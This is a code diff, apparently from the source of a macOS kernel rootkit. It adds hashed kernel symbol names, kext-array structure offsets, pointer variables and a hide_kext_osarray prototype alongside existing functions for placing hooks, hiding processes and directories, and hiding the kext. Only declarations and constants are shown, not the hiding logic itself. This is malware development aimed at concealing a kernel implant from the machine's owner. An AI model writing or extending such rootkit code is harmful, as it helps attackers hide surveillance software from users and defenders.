@@ -31,6 +31,8 @@
 #define PROC_UNLOCK_HASH        0xf46ca50e // _proc_unlock
 #define PROC_LIST_LOCK_HASH     0x9129f0e2 // _proc_list_lock
 #define PROC_LIST_UNLOCK_HASH   0x5337599b // _proc_list_unlock
+#define KEXT_LOOKUP_WITH_TAG    0xcf7000a8 // __ZN6OSKext21lookupKextWithLoadTagEj
+#define IO_RECURSIVE_LOCK       0x1f7127e3 // _IORecursiveLockLock
 
 #pragma mark -
 #pragma mark IOCTL Codes
@@ -107,6 +109,19 @@ MACRO_BEGIN                                                      \
          (elt)->field.prev = NULL;                               \
 MACRO_END
 
+
+#ifdef __LP64__
+#define OFFT_KEXT_KMOD  0x9
+#define OFFT_KEXT_ARRAY 0x18
+#define OFFT_KEXT_COUNT 0x20
+#define OFFT_KMOD_NAME  0x10
+#else
+#define OFFT_KEXT_KMOD  0xa
+#define OFFT_KEXT_ARRAY 0x10
+#define OFFT_KEXT_COUNT 0x14
+#define OFFT_KMOD_NAME  0xc
+#endif
+
 #pragma mark -
 #pragma mark Extern Symbols
 #pragma mark -
@@ -118,7 +133,10 @@ static kmod_info_t *i_kmod              = NULL;
 static int *i_tasks_count               = NULL;
 static int *i_nprocs                    = NULL;
 static lck_mtx_t *i_tasks_threads_lock  = NULL;
+static int *kext_lookup_with_tag        = NULL;
+static int *io_recursive_log            = NULL;
 
+static char *_sLoadedKext                = NULL;
 //decl_lck_mtx_data(static, *i_tasks_threads_lock);
 
 static struct sysent *_sysent;
@@ -159,6 +177,7 @@ void    place_hooks                  ();
 void    remove_hooks                 ();
 void    add_dir_to_hide              (char *, pid_t);
 void    hide_kext_leopard            ();
+void    hide_kext_osarray            ();
 int     hide_proc                    (proc_t, char *, int);
 int     unhide_proc                  (proc_t, int);
 int     unhide_all_procs             ();
